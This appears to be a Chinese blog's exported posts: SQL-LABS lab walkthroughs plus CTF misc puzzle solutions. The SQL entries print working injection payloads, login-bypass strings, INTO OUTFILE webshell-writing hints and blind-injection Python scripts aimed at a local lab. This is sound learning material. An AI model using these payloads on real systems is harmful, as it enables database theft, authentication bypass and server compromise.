&#123; $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 对参数的处理：12$uname=check_input($_POST[&apos;uname&apos;]); $passwd=$_POST[&apos;passwd&apos;]; 这里涉及到几个函数： addslashes()在预定义字符之前添加反斜杠的字符串详细介绍 get_magic_quotes_gpc()详细介绍 stripslashes()删除由addslashes函数添加的反斜杠详细介绍 mysql_real_escape_string()转义SQL语句中使用的字符串中的特殊字符详细介绍 因为对username的输入做了各种转义处理，所以不能使用uname进行注入。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-LABS入门到放弃5（part1）]]></title>
    <url>%2F2018%2F03%2F23%2FSQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%835%EF%BC%88part1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言前面的关卡都是基于get请求的，从这个关卡起，我们就要走进post注入的世界了，什么是post呢？就是数据从客户端提交到服务器端，例如在登录过程中输入的用户名和密码，这些数据以表单的形式提交到服务器端，然后在服务器端进行验证（一堆废话23333 基础知识让我们来熟悉一下一次POST请求和数据库交互的过程吧。 提交正常的username和password 1username=ju5tw4nty0u&amp;password=12345 假设后台的sql查询语句为 1@$sql=&quot;select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1&quot;; 这是我们构造的语句为 1@$sql=&quot;select username,password from users where username=&apos;ju5tw4nty0u&apos; and password=&apos;12345&apos; limit 0,1&quot;; 当我们提交的username和password为 1username=ju5tw4nty0u&apos;#&amp;password=12345 这时查询语句为 1@$sql=&quot;select username,password from users where username=&apos;ju5tw4nty0u&apos;# &apos;and password=&apos;12345&apos; limit 0,1&quot;; 可以看到#将后面的语句注释掉了，所以只要我们输入的用户名为ju5tw4nty0u时，就能够成功登陆； 当我们用户名也不知道的时候，可以构造ju5tw4nty0u&#39; or 1=1#来实现登录； 这就是POST注入的基本原理了，让我们走进关卡，感受一下万能密码的妙用吧。 Less-11 当我们输入uname=ju5tw4nty0u’&amp;passwd=123&amp;submit=Submit时发现报错1your MySQL server version for the right syntax to use near &apos;123&apos; LIMIT 0,1&apos; at line 1 可知这里对参数做了单引号的处理 我们可以构造username=ju5tw4nty0u&#39;#&amp;password=123来提交，发现成功登陆； 1uname=ju5tw4nty0u&apos; or 1=1#&amp;passwd=123&amp;submit=Submit 判断字段数 123uname=admin&apos; order by 3#&amp;passwd=123&amp;submit=SubmitUnknown column &apos;3&apos; in &apos;order clause&apos; 查当前数据库 1uname=ju5tw4nty0u&apos; union select 1,database()#&amp;passwd=123&amp;submit=Submit 查所有表 1uname=ju5tw4nty0u&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=123&amp;submit=Submit 查字段 1uname=ju5tw4nty0u&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;#&amp;passwd=123&amp;submit=Submit 字段值 1uname=ju5tw4nty0u&apos; union select 1,group_concat(username) from users#&amp;passwd=123&amp;submit=Submit Less-12 尝试输入uname=ju5tw4nty0u&quot;发现报错，可知对ID参数做了双引号和括号的处理 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&quot;) LIMIT 0,1&apos; at line 1 可以构造uname=ju5tw4nty0u&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit来绕过 查询数据库 1uname=ju5tw4nty0u&quot;) union select 1,database()#&amp;passwd=123&amp;submit=Submit 以此类推，和less-11类似…… Less-13 尝试输入uname=ju5tw4nty0u&#39;发现报错，可知对ID参数做了单引号和括号的处理 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&apos;) LIMIT 0,1&apos; at line 1 构造uname=ju5tw4nty0u&#39;) or 1=1#&amp;passwd=123&amp;submit=Submit发现登陆成功，不过没有回显具体内容，所以可以考虑使用盲注和报错注入； 使用报错注入查看当前users表的第三个字段（其余的参考less-5） 1uname=ju5tw4nty0u&apos;) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))#&amp;passwd=123&amp;submit=Submit 使用盲注的方法参考less-5，这里就不多赘述了； Less-14 尝试输入uname=ju5tw4nty0u&quot;发现报错，可知对ID参数做了双引号的处理 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;123&quot; LIMIT 0,1&apos; at line 1 构造uname=ju5tw4nty0u&quot; or 1=1#&amp;passwd=123&amp;submit=Submit 因为登陆成功后没有回显具体内容，所以还是使用盲注或者报错注入，参考less-5； Less-15 随便输入判断，发现都没有报错，这里应该是限制了报错注入，当我们使用uname=admin&#39;#&amp;passwd=123&amp;submit=Submit时，显示登陆成功，sql语句对id的处理是单引号； 1uname=ju5tw4nty0u&apos; or 1=1#&amp;passwd=123&amp;submit=Submit 页面没有回显具体内容，所以只能使用盲注来进行注入了，这里参考Less-5； Less-16 随便输入判断，发现都没有报错，这里应该是限制了报错注入，当我们使用uname=admin&quot;)#&amp;passwd=123&amp;submit=Submit时，显示登陆成功，sql语句对id的处理是双引号和括号； 1uname=ju5tw4nty0u&quot;) or 1=1#&amp;passwd=123&amp;submit=Submit 页面没有回显具体内容，所以只能使用盲注来进行注入了，这里参考Less-5； 后记至此POST注入也就告一段落了，总的来说和GET注入是非常类似的，方法也是通用的，由于没有做什么过滤，所以几题做下来还是很轻松的，下一节我们就要讲讲数据库的增删改查了（233333]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-LABS入门到放弃4（part1）]]></title>
    <url>%2F2018%2F03%2F23%2FSQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%834%EF%BC%88part1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Less-8 题目提示Less-8 Blind- Boolian- Single Quotes- String，所以可以知道对id的处理方式为&#39;id&#39;，页面没有返回具体内容，所以可以用bool型盲注。 1http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1&apos; or 1=1--+ 具体参考less-5的ASCII、SUBSTR等函数的结合使用，也可以使用时间盲注。Less-5传送门 To Less-8 从源代码中我们可以看到mysql_error（）被注释了，所以没有办法使用报错注入。 Less-9 题目提示Less-9 Blind- Time based- Single Quotes- String,所以可以知道对id的处理方式为&#39;id&#39;，这里可以使用时间盲注。 具体参考Less-5的做法，这里就不多说了。Less-5传送门 To Less-9 Less-10 题目提示Less-10 Blind- Time based- Double Quotes- String,所以可以知道对id的处理方式为&quot;id&quot;,这里可以使用时间盲注。 具体参考Less-5的做法，这里就不多说了。Less-5传送门 To Less-10 后记因为这几关都是和Less-5类似的，只是对ID的处理有所不同，以及注入方法的不同，这里就偷个懒QAQ。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-LABS入门到放弃3（part1）]]></title>
    <url>%2F2018%2F03%2F23%2FSQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%833%EF%BC%88part1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前面我们已经讲了常见的注入方式了，这次我们来讲讲SQL的文件操作 数据库文件的基本操作Load_file()导出文件load_file(file_name):读取文件并返回该文件的内容作为一个字符串使用条件： 必须有权限读取并且文件必须完全可读 123and (select count(*) from mysql.user)&gt;0 /*如果结果返回正常，说明具有读写权限/*返回错误，应该还是管理员给数据库账号降权 欲读取的文件必须在服务器上 必须指定文件的完整路径 欲读取的文件必须小于max_allowed_packet 难点： 绝对路径不好获取 构造有效的语句（报错出绝对路径）当提交一个错误的query，如果display_error=on，程序会暴露web目录的绝对路径。 文件导入到数据库laod data infile语句用于高速地从一个文本文件中读取行，并装入一个表中，文件名称必须为一个文字字符串。12load data infile &apos;/tmp/t0.txt&apos; ignore into table t0 character set gbk fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos;/*将/tmp/t0.txt导入到t0表中，字符集设置为gbk，每一项数据的分隔符为&apos;\t&apos;,每一行的分隔符为&apos;\n&apos; 导入结果到文件中select ….into outfile ‘file_name’把查询的结果写到一个文件名不重复的文件，创建在服务器主机上，有足够的权限就可以读取结果。 Less-7标题提示dump into outfile，所以我们可以试着用文件导入来注入。这里对id的处理为((&#39;id&#39;))，所以我们可以构造1&#39;))or 1=1--+进行注入 使用less5的方法既可以注入成功（盲注）1http://127.0.0.1/sqli-labs-master/Less-7/index.php?id=1&apos;))or 1=1--+ 使用文件导入的方式1?id=1&apos;)) union select 1,2,(select group_concat(username) from users) into outfile &quot;E:......\\sqli-labs-master\\Less-7\\u6u.txt&quot;--+ u6u.txt的内容：121 Dumb Dumb1 2 Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 这里可以写入一句话木马然后用菜刀等工具来连接。 后记通过文件的操作来进行注入要求的条件比较苛刻，在现实条件下不容易实现，但是我们还是需要了解一下。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-LABS入门到放弃2（part1）]]></title>
    <url>%2F2018%2F03%2F17%2FSQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%832%EF%BC%88part1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言上一次我们讲了最基础的联合查询，眼看就来到了Less-5了，这里我接触了更加摸不着头脑的盲注，不过这也让小萌新的我好奇心倍增，那么就让我们一起走进盲注的世界吧，感受一下一脸懵逼的感觉。 盲注及其分类盲注什么是盲注呢？盲注就是在SQL注入过程中，当执行完SQL语句是，我们所查询的数据没办法回显到我们的前端页面，这是我们就只能构造一些逻辑判断来猜解，这个过程就是盲注啦哈哈哈哈（废话一堆）。 分类 基于布尔的盲注（构造逻辑判断） 利用left()函数 利用substr（）、ascii（）函数 利用regexp 利用ord（）、mid（）函数 基于时间的盲注（延时注入） sleep（）函数 benchmark()函数 基于报错的盲注（构造payload让信息通过错误提示回显） concat()、floor（）、rand（）、group by exp() bigint extractvalue() updatexml() 重复特性光看这些就有点懵了，还是通过关卡实践吧，慢慢理解… 常用函数ascii函数返回字符的ASCII值 substr函数同mid函数，参数有3个 * 提取的字段 * 开始位置 * 返回的字符数 left函数得到字符串的左部指定个数的字符，有2个参数： * 要截取的字符串 * 长度 mid函数截取字符串，参数有3个： * 提取的字段 * 开始位置 * 返回的字符数 ord函数同ascii函数，返回字符的ASCII值 sleep函数表示延时。 Less-5基于布尔ascii substr mid ord 输入id=1&#39;报错1the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 说明sql语句中对id的处理为id=&#39;1&#39; 找到了注入点，我们可以使用ASCII和SUBSTR函数进行盲注，构造逻辑条件，根据是否回显You are in...........来确认所要查询的字符 查询数据库： 1?id=1&apos; and 1=(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))&lt;111)--+ 查询表 1?id=1&apos; and 1=(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),1,1))&gt;111)--+ 查询字段 1?id=1&apos; and 1=(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),1,1))&lt;111)--+ 查询字段值 1?id=1&apos; and 1=(ascii(substr((select group_concat(username) from users),1,1))&lt;111)--+ 这里将ascii换成ord函数，讲substr换成mid函数效果是一样的 附上自己写的脚本12345678910111213141516171819202122232425#!/usr/bin/python# -*- coding: UTF-8 -*-import reimport urllibimport urllib2flag = &quot;&quot;for i in range(1,50): for j in range(33,127): #url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot; url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot; #url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(username)%20from%20users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot; #url = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1%27and%20ascii(substr((select%20group_concat(password)%20from%20users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;--+&quot; req = urllib2.Request(url) res_data = urllib2.urlopen(req) res = res_data.read() s = &apos;You are in...........&apos; print res if s in res: flag +=chr(j) print flag breakprint &apos;over！！！&apos;print flag left length 判断数据库长度 1?id=1&apos; and 1=(length(database())&lt;10)--+ 查数据库 1?id=1&apos; and 1=(left(database(),1)=&apos;u&apos;)--+ 查表名 1?id=1&apos; and 1=(left((select group_concat(table_name) from information_schema.tables where table_schema=database()),1)=&apos;e&apos;)--+ 查列名 1?id=1&apos; and 1=(left((select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),2)=&apos;id&apos;)--+ 查字段值 1?id=1&apos; and 1=(left((select group_concat(username) from users),2)=&apos;du&apos;)--+ 在写脚本的时候发现left匹配的时候大小写不区分，所以这里爆破出来的都是大写的字符，需要结合其他函数做一个ascii值的转换，这样才能准确判断出来。 regexp此方法暂时没完全理解，等啥时候懂了再总结。QAQ太菜了自己感觉！！ 基于报错count、 floor、 rand、 group by 函数简介 rand()：用于产生一个0-1的随机数 floor（）：向下取整 floor(rand(0)*2)：将rand函数随机生成的数向下取整，因为*2，所以结果为0或者1 concat()：将符合条件的同一列的不同行进行拼接，加入0x3a是为了方便观察 group by：根据规则分组 count()：统计元组个数 1select count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+ 当前用户、版本、数据库 1?id=1&apos;and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 所有数据库 1?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 所有表 1?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 字段 1?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 字段值 1?id=1&apos;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ 这里参考了http://blog.51cto.com/wt7315/1891458https://www.cnblogs.com/xishaonian/p/6227405.html double数字类型超出范围报错 所有数据库 1?id=1&apos; union select (exp(~(select * from (select schema_name from information_schema.schemata limit 0,1)a))),2,3--+ 所有表 1?id=1&apos; union select (exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))),2,3--+ 所有字段 1?id=1&apos; union select (exp(~(select * from (select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1)a))),2,3--+ 以此类推，模板为 1?id=1&apos; union select (exp(~(select * from (查询语句)a))),2,3--+ bigint溢出 查询字段 1?id=1&apos; union select (!(select * from (select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1)x) - ~0),2,3--+ 模板为 1?id=1&apos; union select (!(select * from (查询语句)x) - ~0),2,3--+ xpath (extractvalue\updatexml) 查询字段 12345extractvalue:?id=1&apos; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))--+updatexml:?id=1&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e),1)--+ extractvalue模板为 1?id=1&apos; and extractvalue(1,concat(0x7e,(查询语句),0x7e))--+ updatexml模板为 1?id=1&apos; and updatexml(1,concat(0x7e,(查询语句),0x7e),1)--+ 数据的重复性报错 查询字段 1?id=1&apos; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+ 模板： 1?id=1&apos; union select 1,2,3 from (select NAME_CONST((语句),1),NAME_CONST((语句),1))x --+ 注意事项 123456name_const(name,value)：返回给定值，当用来产生一个结果集合列时， name_const()促使该列使用给定名称但他的使用范围受限，只适用于一些数据库版本高于5.0.12，但又稍旧的版本，像现在的5.7版本就不用想了...然而我用的就是较新的版本，注入只能显示数据库的版本信息，想要查询其他的信息，会显示Incorrect arguments to NAME_CONST 基于时间sleep 当前数据库 1?id=1&apos; and if ((ascii(substr(database(),1,1))=115),1,sleep(5))--+ 所有数据库名 1?id=1&apos; and if ((ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=115),sleep(5),1)--+ 表名 1?id=1&apos; and if ((ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=10),sleep(5),1)--+ 以此类推 1?id=1&apos; and if ((ascii(substr((语句),1,1))=101),sleep(5),1)--+ 这里我将if的两个参数互换了一下位置，这样错误的时候不会延迟，但是页面返回的是正确时的页面，正确的时候会延迟五秒后响应，这样能够节省爆破时间。12345678910111213141516171819202122import requestsimport timeflag = &apos;&apos;for i in range(1,100): for j in range(33,127): start = time.time() #print n #print start url1 = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos; and if ((ascii(substr((select group_concat(schema_name) from information_schema.schemata),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;),sleep(5),1)--+&quot; #print url #url1 = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos; and if ((ascii(substr((select group_concat(username) from users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;),1,sleep(5))--+&quot; r = requests.get(url=url1) over = time.time() #print over print over - start print &apos;---------------&apos; if over - start &gt; 4: flag += chr(j) print flag breakprint flag benchmark BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep() 查询所有数据库1?id=1&apos;union select (if((substring(current,&quot;+str(i)+&quot;,1)=char(&quot;+str(j)+&quot;)),benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select group_concat(schema_name) as current from information_schema.schemata)as tb1--+ 脚本如下：12345678910111213141516171819202122232425import requestsimport timeflag = &apos;&apos;for i in range(1,100): n = 1 for j in range(33,127): start = time.time() #print start #url1=&quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos;union select (if((substring(current,&quot;+str(i)+&quot;,1)=char(&quot;+str(j)+&quot;)),benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select version() as current)as tb1--+&quot; url1=&quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos;union select (if((substring(current,&quot;+str(i)+&quot;,1)=char(&quot;+str(j)+&quot;)),benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select group_concat(schema_name) as current from information_schema.schemata)as tb1--+&quot; r = requests.get(url=url1) over = time.time() #print over n += 1 print over - start print n print &apos;---------------&apos; if over - start &gt; 4: flag += chr(j) print flag break if n &gt;= (127-33): breakprint flag Less-6 输入id=1&quot;时报错1your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot; LIMIT 0,1&apos; at line 1 所以可以知道sql语句对id做了&quot;1&quot;的处理，我们只要闭合这个双引号，就可以对其进行注入，具体方法同less-5，这里就不多说了。 后记这部分开始涉及到脚本的编写，对不喜欢打代码又不怎么会用python的我，还是废了很多时间在python语法和函数上，最开始写出了一个直接爆破的，后面觉得太慢了，就想着去优化一下，用上了二分法，又折腾了好久，实现完二分法还是不太满意，围哥大佬又说可以用多线程来加快爆破进度，又琢磨了一早上，才勉强改了一个基于ASCII和SUBSTR的多线程的盲注脚本，其他函数的想着还是花点时间去写一写吧。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-LABS入门到放弃1（part1）]]></title>
    <url>%2F2018%2F03%2F16%2FSQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%831%EF%BC%88part1%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言很早之前就想好好研究一下SQL注入，因为各种原因，一直拖到了现在，自己在本地搭了一个sqli-labs，准备好好认识一下SQL注入，希望自己不会半途而废QAQ。 基础知识1、掌握MYSQL的基本语法和对数据的操作；2、了解MYSQL在PHP中是如何调用的；3、如何找到注入点，并且利用注入点实现我们的查询；4、需要会判断过滤规则并熟悉常见的绕过方法； Less-1关卡地址为http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=11、我们可以在id=1后面加一个&#39;,发现报错，应该是因为我们加了&#39;后导致查询语句没有闭合，查看一下源码证实了我们的判断；1$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; 2、所以我们可以构造id=1&#39;or 1=1--+来闭合查询语句；3、我们可以利用order by来判断该表的列数12345?id=1&apos;order by 1--+?id=1&apos;order by 2--+?id=1&apos;order by 3--+?id=1&apos;order by 4--+Unknown column &apos;4&apos; in &apos;order clause&apos; 所以列数为3；4、利用联合查询union来注入12345678查数据库?id=-1&apos;union select 1,2,group_concat(schema_name) from information_schema.schemata--+查所有表?id=-1&apos;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;--+查列名?id=-1&apos;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+查字段?id=-1&apos;union select 1,group_concat(username),group_concat(password) from users--+ 5、通过联合查询我们可以得到我们想要的内容，需要注意的是因为联合查询的特性，我们需要将id设置为id=-1,这样才能得到我们所要查询的内容，还需要注意的是，我们需要使用group_concat函数将查询结果拼接成一个字符串，否则我们只能看到第一条查询结果。 Less-2关卡地址为http://127.0.0.1/sqli-labs-master/Less-2/index.php?id=11、先进行注入点的判断，在id=1后面加一个&#39;,发现报错，是由于奇数个单引号导致语句查询出错，查看源码可知1$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 2、找到了注入点，我们同样使用联合查询来查询所要的内容，payload和Less-1差不多，知识把’去掉； Less-3关卡地址为http://127.0.0.1/sqli-labs-master/Less-3/index.php?id=11、当使用id=1&#39;时报错，提示括号和单引号没有闭合，查看源码1$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;; 2、可以成功注入的可以是id=&#39;)or &#39;1&#39;=(&#39;1、id=&#39;) or 1=1 --+3、payload大致同Less-1，id=-1&#39;） Less-4关卡地址为http://127.0.0.1/sqli-labs-master/Less-4/index.php?id=11、当id=1&quot;时报错，结合前面的内容，容易知道查询语句为1$sql=&quot;SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1&quot;; 2、可以成功注入的有id=1&quot;) or 1=1--+、id=1&quot;) or &quot;1&quot;=(&quot;13、payload同Less-1，id=-1&quot;) 后记Less-1~Less-4大致思路是相同的，不同在于sql语句对id的包装不一样，采用了括号、单引号、双引号等老包装id，只要找到注入点，其他的按照套路就可以解出来了。通过这几个关卡也让我真正理解了SQl注入的原因和原理。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋-CTF训练大本营题解]]></title>
    <url>%2F2018%2F03%2F08%2Fi%E6%98%A5%E7%A7%8B-CTF%E8%AE%AD%E7%BB%83%E5%A4%A7%E6%9C%AC%E8%90%A5%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Misc你好，i春秋按照提示关注微信号icqedu，然后回复1CTF-&gt;关注了-&gt;星期几-&gt;是-&gt;....-&gt;是-&gt;不愿意-&gt;get flag Hello World看题目，flag，就在题目提示里面。 Vape Nation得到一张图片，用StegSolve分析一下，flag在Green plane 0。 百度杯签到题又是调戏微信机器人啊啊啊啊啊啊啊啊啊，好像暴打出题人+11234提示：对百度杯用时下最流行的表白（去调戏i春秋公众号）大声说出你的爱！！！么么哒百度杯么么哒 那些年我追过的贝丝根据题目提示是base64加密解密脚本：123456# ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=import base64decode = &quot;ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=&quot;decode = base64.b64decode(b&apos;ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=&apos;)print decode 我要变成一只程序猿将题目给的字符串放到程序里面运行一下皆可以了。代码如下： 1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main() &#123;char str[100]=&quot;&quot;;int i;int len;printf(&quot;input string:\n&quot;);gets(str);len=strlen(str);printf(&quot;result:\n&quot;);for(i=0;i&lt;len+1;i++)&#123; putchar(str[len-i]);&#125;printf(&quot;\n&quot;);&#125;//ba1f2511fc30423bdb 剧情大反转直接将这串字符串翻转就得到flag了1&#125;~144_0t_em0c14w&#123;galf challenge题目内容：666c61677b686578327374725f6368616c6c656e67657d1、MD5 解不出来2、十六进制转换 getflag解密地址 try again给了一个文件，放到winhex里面，直接ctrl+f 搜索flag可以得到flag 表姐家的签到题题目内容：出题人表示金盆洗手不坑任何参赛选手干脆利落，直接奉上答案就是123456abcdef所以手动加上flag{}就过了 泄露的数据125d55ad283aa400af464c76d713c07ad 直接MD5一下就可以了解密地址 考眼力12题目内容： gmbh&#123;4d850d5c3c2756f67b91cbe8f046eebd&#125; 直接凯撒一下就能得到flag flag格式题目内容：你真的知道flag格式吗？尝试提交flag{0ahief9124jfjir}直接提交就过了！！！ 所以这是13点吗12题目内容：synt&#123;mur_VF_syn9_svtug1at&#125; 直接凯撒解密皆可以得到flag 加群签到题123456题目内容：加群得flag：496265176一群已满，请做这题的大佬们加入二群：455849389flag也转移到二群啦~key：ichunqiumemeda 在群文件找到压缩包，解压得到flag。 小可爱得到一张图片1、binwalk分离出压缩包；2、暴力破解压缩包密码；3、得到一张撕碎的二维码4、还原一下二维码即可得到flag（很想打出题人有没有） 贝斯家族题目意思应该是base64加密，进一步判断发现是base32加密解密如下：12345&gt;&gt;&gt;import base64&gt;&gt;&gt; decode = base64.b32decode(b&apos;MZWGCZ33MVZGQZLJL5STQOJTGRPWK4SVJ56Q====&apos;)&gt;&gt;&gt; decodeb&apos;flag&#123;erhei_e8934_erUO&#125;&apos;&gt;&gt;&gt; 山岚12题目内容：f5-lf5aa9gc9&#123;-8648cbfb4f979c-c2a851d6e5-c&#125; 容易想到是栅栏密码，解密一下得到flag。 签到题2unicode编码，不过使用在线转换一直转换不了，就直接替换成十六进制，然后在解密。 123\u0066\u006c\u0061\u0067\u007b\u0074\u0068\u0031\u0073\u005f\u0069\u0073\u005f\u0055\u006e\u0031\u0063\u0030\u0064\u0065\u005f\u0079\u006f\u0075\u005f\u004b\u006e\u006f\u0077\u003f\u007d 66 6c 61 67 7b 74 68 31 73 5f 69 73 5f 55 6e 31 63 30 64 65 5f 79 6f 75 5f 4b 6e 6f 77 3f 7d 滴滴滴一看就知道是摩斯电码,解密后发现格式不对，就照着修改修改，得到flag。12345678..-. .-.. .- --. . --... .---- -.-. .- ..... -.-. -.. -....- --... -.. -... ----. -....- ....- -... .- ...-- -....- ----. ...-- ---.. ...-- -....- .---- .- ..-. ---.. -.... --... ---.. ---.. .---- ..-. ----- --...FLAG E71CA5CD null 7DB9 null 4BA3 null 9383 null 1AF867881F07FLAG&#123;E71CA5CD-7DB9-4BA3-9383-1AF867881F07&#125;flag&#123;e71ca5cd-7db9-4ba3-9383-1af867881f07&#125; XX题目提示XX，想到是XXencode解密地址12题目内容：LNalVNrhIO4ZnLqZnLpVsAqtXA4FZTEc+ 敲击1、敲击密码 不是QAQ2、键盘密码 getflag1234题目内容：方方格格，不断敲击“wdvtdz qsxdr werdzxc esxcfr uygbn”flag格式为：flag&#123;小写的字符串&#125; 签到题3MD5解密一下得到flag解密地址1234题目内容：21232f297a57a5a743894a0e4a801fc3flag&#123;admin&#125; 小常识这个知识点不是很了解QWQ1234567891011题目内容：低频ID卡数据格式转换小常识将下列16进制串中倒数第5，6位转换为3位十进制数，将最后4位转换为5位十进制卡号，中间用“，”分开。0 0 0 0 94 466494 = 1484664 = 18020（用计算机进制转换得出）flag&#123;148,18020&#125; 回归原始应该是二进制转化123456题目内容：让我们回到最开始的地方011001100110110001100001011001110111101101100011011001010011001101100101001101010011000000110010011000110010110100110100001110000110001100111001001011010011010001100100001101010011000000101101001110010011100100111001001100000010110100110101011000100011100000110001011001000110001000110110011001100110001101100010011001100011000001111101f l a g &#123; c e 3 e 5 0 2 c - 4 8 c 9 - 4 d 5 0 - 9 9 9 0 - 5 b 8 1 d b 6 f c b f 0 &#125;flag&#123;ce3e502c-48c9-4d50-9990-5b81db6fcbf0&#125; 